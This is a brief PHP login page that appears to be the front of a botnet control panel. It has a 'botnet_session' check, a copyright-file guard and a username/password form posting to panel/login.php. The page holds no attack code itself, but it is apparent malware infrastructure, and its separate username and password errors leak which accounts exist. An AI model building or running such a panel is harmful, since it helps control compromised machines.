<?
session_start();
include("includes/configuration.inc.php");
if(isset($_SESSION['botnet_session']))
{
if($_SESSION['botnet_session'] == $security_token) 
{
echo "<script>window.location='panel';</script>";
}
}
?>
<html>
<head>
<div id="z">
<title>Mustafa Riadh</title>
<link rel="stylesheet" type="text/css" href="style/plugins.css">
<link rel="stylesheet" type="text/css" href="style.css">
<?
if(file_exists("mustafa.php")) 
{
$checker = fopen("mustafa.php","r");
$copyrights = fgets($checker);
if ($copyrights != "mustafa Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
<link rel="stylesheet" type="text/css" href="style/index.css">
<link rel="stylesheet" type="text/css" href="style/login.css">
</head>
<body>
<?
if(isset($_GET['error']))
{
if($_GET['error'] == 1)
{
?>
<div id='bad_report'>Incorrect Username</div>
<?
}
elseif($_GET['error'] == 2)
{
?>
<div id='bad_report'>Incorrect Password</div>
<?
}
}
?>
<center>
<br><br><br><br><br><br><br><br>
<div id="login_form">
<a class="login_title">Please Login First</a>
<form action="panel/login.php" method="post">
<br>
<input type="text" name="username" class="login_input" placeholder="USERNAME">
<br>
<input type="password" name="password" class="login_input" placeholder="PASSWORD">
<br>
<input type="submit" name="submit" class="login_submit" value="LOGIN&nbsp;">
</form>
</div>
</center>
</body>
</html>